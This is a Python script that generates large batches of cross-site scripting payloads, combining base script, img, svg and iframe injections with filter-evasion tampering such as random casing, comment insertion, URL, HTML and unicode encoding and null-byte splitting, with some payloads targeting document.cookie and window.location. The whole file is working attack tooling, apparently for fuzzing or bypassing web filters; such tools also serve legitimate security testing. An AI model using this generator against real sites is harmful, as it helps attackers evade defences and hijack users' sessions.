import random



keywords = [
    "alert", "document", "cookie", "window", "location", "href", "eval",
    "src", "onerror", "onload", "script", "img", "iframe", "input",
    "textarea", "button", "svg", "body", "div", "a", "link", "meta",
    "object", "embed", "form", "submit", "exec", "background", "focus",
    "style", "handler", "attr", "charCode", "fromCharCode", "String", 
    "refresh", "click", "cmd"
]


special_characters = [
    "<", ">", "\"", "\'", "/", "\\", "(", ")", "{", "}", "[", "]",
    ";", ":", "&", "=", "-", "_", "+", "?", "%", "#", "@", "$", "^",
    "*", "!"
]


base_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=\"javascript:alert('XSS')\">",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src=\"javascript:alert('XSS');\"></iframe>",
    "<input type=\"text\" value=\"\" onfocus=\"alert('XSS')\">",
    "<link rel=\"stylesheet\" href=\"javascript:alert('XSS');\">",
    "<object data=\"javascript:alert('XSS')\">",
    "<embed src=\"javascript:alert('XSS')\">"
]

def randomize_case(payload):
    return ''.join(random.choice([c.upper(), c.lower()]) for c in payload)

def insert_whitespace(payload):
    parts = payload.split()
    return ' '.join(part + ' ' * random.randint(0, 2) for part in parts)

def comment_injection(payload):
    comments = ['/*', '*/', '<!--', '-->']
    index = random.randint(0, len(payload))
    return payload[:index] + random.choice(comments) + payload[index:]

def char_encode(payload):
    encode_type = random.choice(['url', 'html', 'unicode'])
    if encode_type == 'url':
        return ''.join(f'%{ord(c):02x}' for c in payload)
    elif encode_type == 'html':
        return ''.join(f'&#{ord(c)};' for c in payload)
    else:  # unicode
        return ''.join(f'\\u{ord(c):04x}' for c in payload)

def generate_attribute_payload():
    events = ['onload', 'onerror', 'onmouseover', 'onclick', 'onmouseout']
    tags = ['img', 'body', 'svg', 'iframe']
    actions = ['alert', 'eval', 'document.cookie']
    
    tag = random.choice(tags)
    event = random.choice(events)
    action = random.choice(actions)
    
    return f'<{tag} {event}="{action}(\'XSS\')">'

def generate_script_payload():
    actions = ['alert', 'eval', 'document.cookie', 'window.location']
    action = random.choice(actions)
    return f'<script>{action}(\'XSS\');</script>'

def generate_encoded_payload():
    base_payload = "<script>alert('XSS')</script>"
    encoding = random.choice(['hex', 'unicode', 'decimal'])
    
    if encoding == 'hex':
        return ''.join([f'%{ord(c):02X}' for c in base_payload])
    elif encoding == 'unicode':
        return ''.join([f'\\u{ord(c):04X}' for c in base_payload])
    else:  # decimal
        return ''.join([f'&#x{ord(c):x};' for c in base_payload])

def mutate_payload(payload):
    mutations = [
        lambda p: p.replace('script', 'scr\0ipt'),
        lambda p: p.replace('<', '&lt;'),
        lambda p: p.replace('>', '&gt;'),
        lambda p: p.replace('\'', '&#39;'),
        lambda p: p.replace('"', '&quot;'),
    ]
    return random.choice(mutations)(payload)

def smart_tamper(payload):
    tampering_functions = [
        randomize_case,
        insert_whitespace,
        comment_injection,
        char_encode,
        mutate_payload
    ]
    
    # Apply 1 to 3 tampering functions randomly
    for _ in range(random.randint(1, 3)):
        func = random.choice(tampering_functions)
        payload = func(payload)
    
    return payload

def generate_payload():
    generators = [
        generate_attribute_payload,
        generate_script_payload,
        generate_encoded_payload,
        lambda: random.choice(base_payloads),
    ]
    
    payload = random.choice(generators)()
    if random.random() < 0.3:  # 30% chance of additional mutation
        payload = mutate_payload(payload)
    
    return smart_tamper(payload)

def generate_payloads(n=1000):
    return [generate_payload() for _ in range(n)]